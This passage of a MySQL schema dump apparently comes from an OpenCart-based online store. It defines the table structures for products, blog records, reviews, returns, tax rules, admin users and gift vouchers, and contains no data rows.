  `date_end` date NOT NULL DEFAULT '0000-00-00',
  PRIMARY KEY (`product_discount_id`),
  KEY `product_id` (`product_id`)
) ENGINE=MyISAM AUTO_INCREMENT=552 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_filter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_filter` (
  `product_id` int(11) NOT NULL,
  `filter_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`filter_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_image`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_image` (
  `product_image_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`product_image_id`),
  KEY `product_id` (`product_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2737 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_option`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_option` (
  `product_option_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `option_id` int(11) NOT NULL,
  `value` text NOT NULL,
  `required` tinyint(1) NOT NULL,
  PRIMARY KEY (`product_option_id`)
) ENGINE=MyISAM AUTO_INCREMENT=277 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_option_value`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_option_value` (
  `product_option_value_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_option_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  `option_id` int(11) NOT NULL,
  `option_value_id` int(11) NOT NULL,
  `quantity` int(3) NOT NULL,
  `subtract` tinyint(1) NOT NULL,
  `price` decimal(15,4) NOT NULL,
  `price_prefix` varchar(1) NOT NULL,
  `points` int(8) NOT NULL,
  `points_prefix` varchar(1) NOT NULL,
  `weight` decimal(15,8) NOT NULL,
  `weight_prefix` varchar(1) NOT NULL,
  PRIMARY KEY (`product_option_value_id`)
) ENGINE=MyISAM AUTO_INCREMENT=120 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_recurring`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_recurring` (
  `product_id` int(11) NOT NULL,
  `recurring_id` int(11) NOT NULL,
  `customer_group_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`recurring_id`,`customer_group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_related`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_related` (
  `product_id` int(11) NOT NULL,
  `related_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`related_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_reward`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_reward` (
  `product_reward_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL DEFAULT '0',
  `customer_group_id` int(11) NOT NULL DEFAULT '0',
  `points` int(8) NOT NULL DEFAULT '0',
  PRIMARY KEY (`product_reward_id`)
) ENGINE=MyISAM AUTO_INCREMENT=638 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_special`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_special` (
  `product_special_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `customer_group_id` int(11) NOT NULL,
  `priority` int(5) NOT NULL DEFAULT '1',
  `price` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `date_start` date NOT NULL DEFAULT '0000-00-00',
  `date_end` date NOT NULL DEFAULT '0000-00-00',
  PRIMARY KEY (`product_special_id`),
  KEY `product_id` (`product_id`)
) ENGINE=MyISAM AUTO_INCREMENT=523 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_to_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_to_category` (
  `product_id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`category_id`),
  KEY `category_id` (`category_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_to_download`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_to_download` (
  `product_id` int(11) NOT NULL,
  `download_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`download_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_to_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_to_layout` (
  `product_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`product_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_product_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_product_to_store` (
  `product_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`product_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_rate_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_rate_comment` (
  `comment_id` int(11) unsigned NOT NULL,
  `customer_id` int(11) unsigned NOT NULL,
  `delta` float(9,3) DEFAULT '0.000',
  `rate_id` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`rate_id`),
  KEY `comment_id` (`comment_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_rate_review`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_rate_review` (
  `review_id` int(11) unsigned NOT NULL,
  `customer_id` int(11) unsigned NOT NULL,
  `delta` float(9,3) DEFAULT '0.000',
  `rate_id` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`rate_id`),
  KEY `review_id` (`review_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `blog_main` int(11) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `sort_order` int(11) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `customer_group_id` int(2) NOT NULL,
  `customer_id` int(11) NOT NULL DEFAULT '0',
  `author` varchar(255) DEFAULT '',
  `comment` text NOT NULL,
  `comment_status` tinyint(1) NOT NULL,
  `comment_status_reg` tinyint(1) NOT NULL,
  `comment_status_now` tinyint(1) NOT NULL,
  `date_available` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_end` datetime NOT NULL DEFAULT '2033-03-03 00:00:00',
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `viewed` int(5) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_id`),
  KEY `blog_main` (`blog_main`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_attribute`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_attribute` (
  `record_id` int(11) NOT NULL,
  `attribute_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `text` text NOT NULL,
  PRIMARY KEY (`record_id`,`attribute_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_description` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `sdescription` text NOT NULL,
  `description` text NOT NULL,
  `meta_h1` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `meta_title` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  `meta_keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`record_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_image`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_image` (
  `record_image_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `options` text NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_image_id`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_product_related`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_product_related` (
  `record_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_related`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_related` (
  `pointer_id` int(11) NOT NULL,
  `related_id` int(11) NOT NULL,
  `pointer` varchar(128) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  KEY `pointer` (`pointer_id`,`pointer`),
  KEY `related` (`related_id`,`pointer`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_tag` (
  `record_tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `tag` varchar(32) NOT NULL,
  PRIMARY KEY (`record_tag_id`),
  KEY `record_id` (`record_id`),
  KEY `language_id` (`language_id`),
  KEY `tag` (`tag`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_to_blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_to_blog` (
  `record_id` int(11) NOT NULL,
  `blog_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`blog_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_to_download`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_to_download` (
  `record_id` int(11) NOT NULL,
  `download_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`download_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_to_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_to_layout` (
  `record_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`record_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_record_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_record_to_store` (
  `record_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`record_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_recurring`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_recurring` (
  `recurring_id` int(11) NOT NULL AUTO_INCREMENT,
  `price` decimal(10,4) NOT NULL,
  `frequency` enum('day','week','semi_month','month','year') NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `cycle` int(10) unsigned NOT NULL,
  `trial_status` tinyint(4) NOT NULL,
  `trial_price` decimal(10,4) NOT NULL,
  `trial_frequency` enum('day','week','semi_month','month','year') NOT NULL,
  `trial_duration` int(10) unsigned NOT NULL,
  `trial_cycle` int(10) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `sort_order` int(11) NOT NULL,
  PRIMARY KEY (`recurring_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_recurring_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_recurring_description` (
  `recurring_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`recurring_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_return`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_return` (
  `return_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `email` varchar(96) NOT NULL,
  `telephone` varchar(32) NOT NULL,
  `product` varchar(255) NOT NULL,
  `model` varchar(64) NOT NULL,
  `quantity` int(4) NOT NULL,
  `opened` tinyint(1) NOT NULL,
  `return_reason_id` int(11) NOT NULL,
  `return_action_id` int(11) NOT NULL,
  `return_status_id` int(11) NOT NULL,
  `comment` text,
  `date_ordered` date NOT NULL DEFAULT '0000-00-00',
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`return_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_return_action`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_return_action` (
  `return_action_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`return_action_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_return_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_return_history` (
  `return_history_id` int(11) NOT NULL AUTO_INCREMENT,
  `return_id` int(11) NOT NULL,
  `return_status_id` int(11) NOT NULL,
  `notify` tinyint(1) NOT NULL,
  `comment` text NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`return_history_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_return_reason`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_return_reason` (
  `return_reason_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(128) NOT NULL,
  PRIMARY KEY (`return_reason_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_return_status`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_return_status` (
  `return_status_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(32) NOT NULL,
  PRIMARY KEY (`return_status_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_review`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_review` (
  `review_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `parent_id` int(11) NOT NULL,
  `sorthex` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `author` varchar(64) NOT NULL,
  `text` text NOT NULL,
  `rating` int(1) NOT NULL,
  `rating_mark` tinyint(1) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `language_id` int(11) NOT NULL DEFAULT '1',
  `type_id` int(11) NOT NULL DEFAULT '1',
  `cmswidget` int(11) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`review_id`),
  KEY `product_id` (`product_id`),
  KEY `customer_id` (`customer_id`),
  KEY `rating_mark` (`rating_mark`),
  KEY `rating` (`rating`),
  KEY `type_id` (`type_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_review_fields`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_review_fields` (
  `product_id` int(11) NOT NULL,
  `review_id` int(11) NOT NULL,
  `mark` varchar(255) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  KEY `review_id` (`review_id`),
  KEY `product_id` (`product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_setting`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_setting` (
  `setting_id` int(11) NOT NULL AUTO_INCREMENT,
  `store_id` int(11) NOT NULL DEFAULT '0',
  `code` varchar(32) NOT NULL,
  `key` varchar(64) NOT NULL,
  `value` longtext NOT NULL,
  `serialized` tinyint(1) NOT NULL,
  PRIMARY KEY (`setting_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2245 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_stock_status`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_stock_status` (
  `stock_status_id` int(11) NOT NULL AUTO_INCREMENT,
  `language_id` int(11) NOT NULL,
  `name` varchar(32) NOT NULL,
  PRIMARY KEY (`stock_status_id`,`language_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_store` (
  `store_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `url` varchar(255) NOT NULL,
  `ssl` varchar(255) NOT NULL,
  PRIMARY KEY (`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_tax_class`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_tax_class` (
  `tax_class_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(32) NOT NULL,
  `description` varchar(255) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`tax_class_id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_tax_rate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_tax_rate` (
  `tax_rate_id` int(11) NOT NULL AUTO_INCREMENT,
  `geo_zone_id` int(11) NOT NULL DEFAULT '0',
  `name` varchar(32) NOT NULL,
  `rate` decimal(15,4) NOT NULL DEFAULT '0.0000',
  `type` char(1) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`tax_rate_id`)
) ENGINE=MyISAM AUTO_INCREMENT=88 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_tax_rate_to_customer_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_tax_rate_to_customer_group` (
  `tax_rate_id` int(11) NOT NULL,
  `customer_group_id` int(11) NOT NULL,
  PRIMARY KEY (`tax_rate_id`,`customer_group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_tax_rule`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_tax_rule` (
  `tax_rule_id` int(11) NOT NULL AUTO_INCREMENT,
  `tax_class_id` int(11) NOT NULL,
  `tax_rate_id` int(11) NOT NULL,
  `based` varchar(10) NOT NULL,
  `priority` int(5) NOT NULL DEFAULT '1',
  PRIMARY KEY (`tax_rule_id`)
) ENGINE=MyISAM AUTO_INCREMENT=128 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_upload`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_upload` (
  `upload_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `filename` varchar(255) NOT NULL,
  `code` varchar(255) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`upload_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_url_alias`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_url_alias` (
  `url_alias_id` int(11) NOT NULL AUTO_INCREMENT,
  `query` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`url_alias_id`),
  KEY `query` (`query`),
  KEY `keyword` (`keyword`)
) ENGINE=MyISAM AUTO_INCREMENT=1336 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_url_alias_blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_url_alias_blog` (
  `url_alias_id` int(11) NOT NULL AUTO_INCREMENT,
  `query` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `language_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`url_alias_id`)
) ENGINE=MyISAM AUTO_INCREMENT=197 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_user` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_group_id` int(11) NOT NULL,
  `username` varchar(20) NOT NULL,
  `password` varchar(40) NOT NULL,
  `salt` varchar(9) NOT NULL,
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `email` varchar(96) NOT NULL,
  `image` varchar(255) NOT NULL,
  `code` varchar(40) NOT NULL,
  `ip` varchar(40) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_user_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_user_group` (
  `user_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `permission` text NOT NULL,
  PRIMARY KEY (`user_group_id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_voucher`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_voucher` (
  `voucher_id` int(11) NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `code` varchar(10) NOT NULL,
  `from_name` varchar(64) NOT NULL,
  `from_email` varchar(96) NOT NULL,
  `to_name` varchar(64) NOT NULL,
  `to_email` varchar(96) NOT NULL,
  `voucher_theme_id` int(11) NOT NULL,
  `message` text NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`voucher_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_voucher_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_voucher_history` (
  `voucher_history_id` int(11) NOT NULL AUTO_INCREMENT,
  `voucher_id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`voucher_history_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_voucher_theme`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_voucher_theme` (
  `voucher_theme_id` int(11) NOT NULL AUTO_INCREMENT,
  `image` varchar(255) NOT NULL,
  PRIMARY KEY (`voucher_theme_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_voucher_theme_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_voucher_theme_description` (
  `voucher_theme_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(32) NOT NULL,
  PRIMARY KEY (`voucher_theme_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
